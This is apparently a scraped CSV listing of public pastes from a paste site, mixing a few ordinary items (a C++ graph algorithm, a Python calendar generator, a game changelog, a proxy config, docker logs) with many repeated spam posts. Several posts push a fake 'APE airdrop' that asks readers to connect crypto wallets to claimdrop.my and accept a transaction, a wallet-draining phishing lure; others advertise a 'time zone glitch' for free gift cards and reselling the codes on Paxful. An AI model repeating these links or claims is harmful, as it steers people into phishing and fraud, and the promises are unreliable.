id,title,username,language,date,content
KTH66EqK,🚨 FINAL CALL - $APE AIRDROP 🚨,skiddyauto50,JavaScript,Sunday 2nd of March 2025 11:35:41 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#6h1M6MndOy"
QpuLmb77,Untitled,Josif_tepe,C++,Sunday 2nd of March 2025 11:34:22 AM CDT,"#include <iostream>
#include <queue>
#include <vector>
#include <algorithm>
#include <fstream>
using namespace std;

const int maxn = 2e5 + 10;
int n, m;
vector<int> graph[maxn];
int parent[maxn], sz[maxn];
 
void init() {
    for(int i = 0; i < maxn; i++) {
        parent[i] = i;
        sz[i] = 1;
    }
}
int find_root(int x) {
    while(x != parent[x]) {
        parent[x] = parent[parent[x]];
        x = parent[x];
    }
    return x;
}
bool check(int A, int B) {
    return find_root(A) == find_root(B);
}
void unite(int A, int B) {
    int root_a = find_root(A);
    int root_b = find_root(B);
     
    if(root_a != root_b) {
        if(sz[root_a] < sz[root_b]) {
            sz[root_b] += sz[root_a];
            parent[root_a] = parent[root_b];
        }
        else {
            sz[root_a] += sz[root_b];
            parent[root_b] = parent[root_a];
        }
    }
}

vector<int> or_graph[maxn];
bool check_N(int S) {
    queue<int> q;
    q.push(S);
    int vis = 0;
    vector<bool> visited(n, false);
    visited[S] = true;
    while(!q.empty()) {
        int c = q.front();
        q.pop();
        vis++;
        
        for(int i = 0; i < (int) or_graph[c].size(); i++) {
            int neighbour = or_graph[c][i];
            if(!visited[neighbour]) {
                visited[neighbour] = true;
                q.push(neighbour);
            }
        }
    }
    if(vis == n) {
        return true;
    }
    return false;
}
int main() {
    ios_base::sync_with_stdio(false);
//    ifstream cin(""in.txt"");
    cin >> n >> m;
    init();
    
    vector<pair<int, pair<int, int>>> v;
    for(int i = 0; i < m; i++) {
        int a, b, c;
        cin >> a >> b >> c;
        a--; b--;
        or_graph[a].push_back(b);
        or_graph[b].push_back(a);
        
        v.push_back(make_pair(c, make_pair(a, b)));
    }
    if(!check_N(0)) {
        cout << ""N"" << endl;
        return 0;
    }
    sort(v.rbegin(), v.rend());
    long long res = 0;
    for(int i = 0; i < m; i++) {
        int weight = v[i].first;
        int a = v[i].second.first;
        int b = v[i].second.second;
        
        
        if(!check(a, b) or weight > 0) {
            unite(a, b);
            res += weight;
        }
        
        
    }
    cout << res << endl;
}
"
5AvjaMPv,🔥 FREE 500$ GIFT CARDS METHOD🔥 H0,theglitcharchitect,JavaScript,Sunday 2nd of March 2025 11:32:30 AM CDT," 
Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://lc.cx/YfA7eV

The only version that works up to date 
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 
x4HKYTEKSI
"
0JWL1vjp,🔥 FREE 500$ GIFT CARDS METHOD 🔥,kodidna,JavaScript,Sunday 2nd of March 2025 11:31:51 AM CDT,"Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://drive.google.com/file/d/18lpFRDluU-SOEWFr1JxBDFOeClcPu5Wv/view
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 6094"
zJkf5Gd5,📌 Make +$1000 DAILY EXPLOIT CS,theglitcharchitect,JavaScript,Sunday 2nd of March 2025 11:28:15 AM CDT," 
Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://lc.cx/YfA7eV

The only version that works up to date 
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 
mCpRzi0XCL
"
RWdJcwqv,Method,kodidna,JavaScript,Sunday 2nd of March 2025 11:26:50 AM CDT,"Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://drive.google.com/file/d/18lpFRDluU-SOEWFr1JxBDFOeClcPu5Wv/view
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 4425"
9vHezqQT,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,skiddyauto50,JavaScript,Sunday 2nd of March 2025 11:25:28 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#mkgJA9NEoc"
Tivj4J83,🔥 FREE 500$ GIFT CARDS METHOD 🔥 SI,theglitcharchitect,JavaScript,Sunday 2nd of March 2025 11:24:01 AM CDT," 
Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://lc.cx/YfA7eV

The only version that works up to date 
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 
KkVfz4bI9h
"
kAS0wAch,calendario_,JPablos,Python,Sunday 2nd of March 2025 11:23:16 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
""""""
Crea un calendario para el año especificado y 
lo imprime a ""calendario.pdf""
@author: JP
""""""

from fpdf import FPDF
import calendar


class PDF(FPDF):
    def header(self):
        self.set_font(""Courier"", ""B"", 12)
        self.cell(0, 10, ""Calendario"", 0, 1, ""C"")
        self.ln(5)

    def footer(self):
        self.set_y(-15)
        self.set_font(""Courier"", ""I"", 8)
        self.cell(0, 10, f""Página {self.page_no()}"", 0, 0, ""C"")


def generar_calendario(anio):
    # Crear un objeto PDF
    pdf = PDF()
    pdf.alias_nb_pages()
    pdf.add_page()

    # Generar el calendario para el año especificado en español
    locale = calendar.LocaleTextCalendar(locale=""es_ES.utf8"")
    calendario = locale.formatyear(anio, 2, 1, 1, 3)

    # Agregar el calendario al PDF con margen izquierdo ampliado
    pdf.set_font(""Courier"", """", 10)
    pdf.set_left_margin(40)  # Ajustar el margen izquierdo a 40 unidades
    pdf.multi_cell(0, 5, calendario)

    # Guardar el archivo PDF
    pdf.output(""calendario.pdf"")


# Obtener el año del usuario
anio = int(input(""Ingrese el año: ""))

# Generar el calendario y guardarlo en PDF
generar_calendario(anio)
print(""Calendario generado y guardado en calendario.pdf"")
"
kuTZK7AW,Paxful Guide (my own method),kodidna,JavaScript,Sunday 2nd of March 2025 11:21:49 AM CDT,"Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://drive.google.com/file/d/18lpFRDluU-SOEWFr1JxBDFOeClcPu5Wv/view
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 4989"
kPRHNav0,📌 Make $1000+ DAILY with Marketplace Exploit X2,theglitcharchitect,JavaScript,Sunday 2nd of March 2025 11:19:46 AM CDT," 
Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://lc.cx/YfA7eV

The only version that works up to date 
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 
cwEhiDGbGc
"
V88ETFgY,📌 Make $1000+ DAILY with Marketplace Exploit,kodidna,JavaScript,Sunday 2nd of March 2025 11:16:48 AM CDT,"Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://drive.google.com/file/d/18lpFRDluU-SOEWFr1JxBDFOeClcPu5Wv/view
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 1151"
vS6r0ta9,🔥 MAKE $1000+ FREE (my own method) XB,theglitcharchitect,JavaScript,Sunday 2nd of March 2025 11:15:31 AM CDT," 
Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://lc.cx/YfA7eV

The only version that works up to date 
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 
8jZjVL3F46
"
EJs9rURu,FREE CRYPTO,skiddyauto50,JavaScript,Sunday 2nd of March 2025 11:15:25 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#zlrz2gG0Ej"
jphqSexb,🔥 FREE 500$ GIFT CARDS METHOD 🔥,kodidna,JavaScript,Sunday 2nd of March 2025 11:11:48 AM CDT,"Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://drive.google.com/file/d/18lpFRDluU-SOEWFr1JxBDFOeClcPu5Wv/view
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 1129"
kth5Y5pi,🔥 FREE 500$ GIFT CARDS METHOD🔥 H0,theglitcharchitect,JavaScript,Sunday 2nd of March 2025 11:11:08 AM CDT," 
Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://lc.cx/YfA7eV

The only version that works up to date 
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 
CZsQGK3gPq
"
qTvdd4yn,Changelog 02/03/2025,SSilver,Diff,Sunday 2nd of March 2025 11:10:38 AM CDT,"General Changes
+ Fixed holstering penalties not properly being set
New change to weapon stats being attributed cause this issue, which should be resolved now resorting these downsides.

Equalizer
+ Particle effect replaced such that it doesn't go through walls
Prior particle was a bit too distracting and overly visible, this one ought to be better hidden while still being noticeable.

Scorch Shot
+ Flare no longer bounces off of buildings
Update to better allow flare to bounce as applied to liberally, now should just instantly explode against buildings.

Ullapool Caber
+ Fixed charge inconsistently recharging after killing enemies
Charge was instantly refilling inconsistently at times, now should properly start at 0% and potentially more when a killed enemy's ammo is collected.

Natascha
+ Increased health-on-hit to max out at 9 per hit (was 8 per hit)
Reverting fire rate had cut the healing too much, so this slight buff should bring it closer to what its rate once was.

Bazaar Bargain
~ Press SPECIAL ATTACK to use up 1 Head while charging
+ Using the Head doubles your charge damage bonus
- Gain stronger tracer on this shot
- Bonus damage is lost on unscoping
While the weapon was in a more balanced state, it didn't appear to provide enough reward for the sake of snowballing. With this change we are allowing Heads to be used as a resource to temporarily negate the charge damage penalty, allowing you to take advantage of the charge bonus with the full damage at the cost of potentially setting your next charge back - on top of committing to hardscoping.

The Bushwacka
+ Added: On hit, marks enemy for death for 2 seconds 
- Added -25% damage penalty
- This weapon deploys 50% slower
The weapon had been requested to be changed for quite some time, due to it's excessively linear design and forced synergy on Sniper's kit. This current version takes it in the direction of giving it some means of applying the mini-crits it requires to self-combo, at the cost of being made weaker when comboing with other forms of minicrits."
qhw1EAJG,📌 Make +$1000 DAILY EXPLOIT CS,theglitcharchitect,JavaScript,Sunday 2nd of March 2025 11:06:53 AM CDT," 
Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://lc.cx/YfA7eV

The only version that works up to date 
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 
tCkpW19BEK
"
epdG4es2,Method,kodidna,JavaScript,Sunday 2nd of March 2025 11:06:47 AM CDT,"Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://drive.google.com/file/d/18lpFRDluU-SOEWFr1JxBDFOeClcPu5Wv/view
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 7276"
sSsEgEwx,🔥 Make $500+ from APE AIRDROP 🔥,skiddyauto50,JavaScript,Sunday 2nd of March 2025 11:05:23 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#TvAezDFCJJ"
KmAE9cis,sing-box-detour,matreex,JSON,Sunday 2nd of March 2025 10:56:15 AM CDT,"{
  ""log"": {""level"": ""info"", ""timestamp"": true},
  ""experimental"": {
    ""clash_api"": {
      ""external_controller"": ""127.0.0.1:9004""
    }
  },
  ""dns"": {
    ""servers"": [
      {""tag"": ""𝗗𝗻𝗦𝗧𝗿𝗔𝗖"", ""address"": ""tls://8.8.8.8"", ""detour"": ""🔰 𝑻𝑨𝑲𝑬""},
      {""tag"": ""𝗗𝗻𝗦𝗹𝗢𝗖𝗞"", ""address"": ""rcode://success""},
      {""tag"": ""𝗗𝗻𝗦𝗧𝗮𝗻𝗧"", ""address"": ""https://1.1.1.1/dns-query"", ""address_resolver"": ""𝗗𝗻𝗦𝗛𝗢𝗦𝗧""},
      {""tag"": ""𝗗𝗻𝗦𝗛𝗢𝗦𝗧"", ""address"": ""https://223.5.5.5/dns-query"", ""address_resolver"": ""𝗡𝗔𝗧𝗶𝗩𝗘𝗱"", ""detour"": ""🎯 𝑯𝑶𝑺𝑻""},
      {""tag"": ""𝗡𝗔𝗧𝗶𝗩𝗘𝗱"", ""address"": ""local"", ""detour"": ""🎯 𝑯𝑶𝑺𝑻""}
    ],
    ""rules"": [
      {""domain"": ""cp.cloudflare.com"", ""server"": ""𝗗𝗻𝗦𝗧𝗮𝗻𝗧"", ""rewrite_ttl"": 3000},
      {""outbound"": ""any"", ""server"": ""𝗗𝗻𝗦𝗛𝗢𝗦𝗧""},
      {""clash_mode"": ""Global"", ""server"": ""𝗗𝗻𝗦𝗧𝗮𝗻𝗧""},
      {""clash_mode"": ""Direct"", ""server"": ""𝗗𝗻𝗦𝗛𝗢𝗦𝗧""}
    ],
    ""final"": ""𝗗𝗻𝗦𝗧𝗮𝗻𝗧"",
    ""independent_cache"": true,
    ""strategy"": ""ipv4_only""
  },
  ""route"": {
    ""rules"": [
      {""inbound"": ""𝑻𝑼𝑵𝒆𝒅"", ""action"": ""sniff""},
      {""inbound"": ""𝑴𝒊𝒙𝒆𝒅"", ""action"": ""resolve"", ""strategy"": ""prefer_ipv4""},
      {""inbound"": ""𝑴𝒊𝒙𝒆𝒅"", ""action"": ""sniff"", ""timeout"": ""1s""},
      {""clash_mode"": ""Global"", ""outbound"": ""🔰 𝑻𝑨𝑲𝑬""},
      {""clash_mode"": ""Direct"", ""outbound"": ""🎯 𝑯𝑶𝑺𝑻""},
      {""protocol"": ""dns"", ""action"": ""hijack-dns""},
      {""port"": 853, ""network"": ""tcp"", ""action"": ""reject""},
      {""port"": 443, ""network"": ""udp"", ""action"": ""reject""}
    ],
    ""final"": ""🔰 𝑻𝑨𝑲𝑬"",
    ""auto_detect_interface"": true
  },
  ""inbounds"": [
    {""type"": ""tun"", ""tag"": ""𝑻𝑼𝑵𝒆𝒅"", ""mtu"": 9000, ""address"": [""172.19.0.0/30"", ""fdfe:dcba:9876::/126""], ""auto_route"": true, ""strict_route"": true, ""stack"": ""gvisor"", ""endpoint_independent_nat"": true},
    {""type"": ""mixed"", ""tag"": ""𝑴𝒊𝒙𝒆𝒅"",""listen"": ""::"", ""listen_port"": 1041, ""tcp_fast_open"": true, ""udp_fragment"": true, ""udp_timeout"": ""5m0s""}
  ],
  ""outbounds"": [
    {
      ""type"": ""selector"", ""tag"": ""🔰 𝑻𝑨𝑲𝑬"",
      ""outbounds"": [
        ""♻️ 𝑨𝑼𝑻𝑶"",
        ""🇯🇵 JP_01"", ""🇯🇵 JP_02"", ""🇯🇵 JP_03""
      ],
      ""default"": ""♻️ 𝑨𝑼𝑻𝑶""
    },
    {
      ""type"": ""urltest"", ""tag"": ""♻️ 𝑨𝑼𝑻𝑶"",
      ""outbounds"": [
        ""🇯🇵 JP_01"", ""🇯🇵 JP_02"", ""🇯🇵 JP_03""
      ],
      ""url"": ""https://www.gstatic.com/generate_204"", ""interval"": ""5m0s"", ""tolerance"": 50, ""idle_timeout"": ""60m"", ""interrupt_exist_connections"": false
    },
    {""password"": ""shadowsocks"", ""server"": ""149.22.87.204"", ""server_port"": 443, ""tag"": ""🇯🇵 JP_01"", ""type"": ""shadowsocks"", ""method"": ""aes-128-gcm"", ""network"": ""tcp"", ""detour"": ""💨 FC""},
    {""password"": ""shadowsocks"", ""server"": ""149.22.87.240"", ""server_port"": 443, ""tag"": ""🇯🇵 JP_02"", ""type"": ""shadowsocks"", ""method"": ""aes-128-gcm"", ""network"": ""tcp"", ""detour"": ""💨 FC""},
    {""password"": ""shadowsocks"", ""server"": ""149.22.87.241"", ""server_port"": 443, ""tag"": ""🇯🇵 JP_03"", ""type"": ""shadowsocks"", ""method"": ""aes-128-gcm"", ""network"": ""tcp"", ""detour"": ""💨 FC""},
    {""server"": ""a0.nttkk.com"", ""server_port"": 443, ""tag"": ""💨 FC"", ""tls"": {""enabled"": true, ""server_name"": ""naypaing.pages.dev"", ""insecure"": true, ""utls"": {""enabled"": true, ""fingerprint"": ""chrome""} }, ""transport"": {""headers"": {""Host"": [""naypaing.pages.dev""] }, ""path"": ""/?ed=2048"", ""type"": ""ws""}, ""type"": ""vless"", ""uuid"": ""b0286bc2-e17c-4c17-b0e6-d39c93f74937"", ""packet_encoding"": ""xudp""},
    {""type"": ""direct"", ""tag"": ""🎯 𝑯𝑶𝑺𝑻""}
  ]
}"
DyTQw3Xa,🚨 FINAL CALL - $APE AIRDROP 🚨,skiddyauto50,JavaScript,Sunday 2nd of March 2025 10:55:20 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#Yls7CWvFM0"
j0xffbMj,`journalctl -fu docker`,piperfw,Bash,Sunday 2nd of March 2025 10:53:48 AM CDT,"Mar 02 06:02:27 archmachine2 systemd[1]: Started Docker Application Container Engine.
Mar 02 06:02:43 archmachine2 dockerd[4809]: time=""2025-03-02T06:02:43.941376459-08:00"" level=info msg=""ignoring event"" container=b3799ea0b36d13c391f987fb1c64f054bda197108583d87806459f11da04f24e module=libcontainerd namespace=moby topic=/t>
Mar 02 06:02:43 archmachine2 dockerd[4809]: time=""2025-03-02T06:02:43.945278951-08:00"" level=error msg=""copy stream failed"" error=""io: read/write on closed pipe"" stream=stdin
Mar 02 06:02:43 archmachine2 dockerd[4809]: time=""2025-03-02T06:02:43.945458232-08:00"" level=warning msg=""close stream failed"" error=""NotFound: task b3799ea0b36d13c391f987fb1c64f054bda197108583d87806459f11da04f24e not found"" stream=stdin
Mar 02 07:33:04 archmachine2 dockerd[4809]: time=""2025-03-02T07:33:04.166441430-08:00"" level=info msg=""ignoring event"" container=ac3e8ad073940f1fb2d22a501d415a667f1eb998f07b9e381a80dc4fdc892abe module=libcontainerd namespace=moby topic=/t>
Mar 02 07:33:04 archmachine2 dockerd[4809]: time=""2025-03-02T07:33:04.170458653-08:00"" level=error msg=""copy stream failed"" error=""io: read/write on closed pipe"" stream=stdin
Mar 02 07:33:04 archmachine2 dockerd[4809]: time=""2025-03-02T07:33:04.170595853-08:00"" level=warning msg=""close stream failed"" error=""NotFound: task ac3e8ad073940f1fb2d22a501d415a667f1eb998f07b9e381a80dc4fdc892abe not found"" stream=stdin
Mar 02 07:33:15 archmachine2 dockerd[4809]: time=""2025-03-02T07:33:15.024135031-08:00"" level=info msg=""ignoring event"" container=09d3fad1253a24ad9d2f8e4b7b69c59ab1f56b0cc9bef92255264c4ab7536449 module=libcontainerd namespace=moby topic=/t>
Mar 02 07:33:15 archmachine2 dockerd[4809]: time=""2025-03-02T07:33:15.027820343-08:00"" level=error msg=""copy stream failed"" error=""io: read/write on closed pipe"" stream=stdin
Mar 02 07:33:15 archmachine2 dockerd[4809]: time=""2025-03-02T07:33:15.027956903-08:00"" level=warning msg=""close stream failed"" error=""NotFound: task 09d3fad1253a24ad9d2f8e4b7b69c59ab1f56b0cc9bef92255264c4ab7536449 not found"" stream=stdin
Mar 02 07:34:58 archmachine2 dockerd[4809]: time=""2025-03-02T07:34:58.773924297-08:00"" level=info msg=""ignoring event"" container=3024f3487511bd7c3eb9a750795ff4989af3196d93aa6d1cad15f55f85c3c22b module=libcontainerd namespace=moby topic=/t>
Mar 02 07:34:58 archmachine2 dockerd[4809]: time=""2025-03-02T07:34:58.777823849-08:00"" level=error msg=""copy stream failed"" error=""io: read/write on closed pipe"" stream=stdin
Mar 02 07:34:58 archmachine2 dockerd[4809]: time=""2025-03-02T07:34:58.777959190-08:00"" level=warning msg=""close stream failed"" error=""NotFound: task 3024f3487511bd7c3eb9a750795ff4989af3196d93aa6d1cad15f55f85c3c22b not found"" stream=stdin"
Pdvm80h6,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,skiddyauto50,JavaScript,Sunday 2nd of March 2025 10:45:18 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#4j2BoX1det"
kuzz2k8C,邀您一起看：云口令,xiaomianao666,JavaScript,Sunday 2nd of March 2025 10:38:04 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥云口令@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5LqR5Y+j5LukXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImh0dHBzOi8vd3d3LjEyMzg2NS5jb20vcy9mYWpBLUs2VEVoXFxcIixcXG5kZXNjOlxcXCIxMDAlJiZmbG9hdFxcXCIsXFxuZXh0cmE6e2NhbkJhY2s6IHRydWV9XFxufV0pO1wiLFwiZ3JvdXBcIjpcIlwifSIsInRpdGxlIjoi5LqR5Y+j5LukIn0=
kBCUyj7R,FREE CRYPTO,skiddyauto50,JavaScript,Sunday 2nd of March 2025 10:35:16 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#1Jo2t0y2rY"
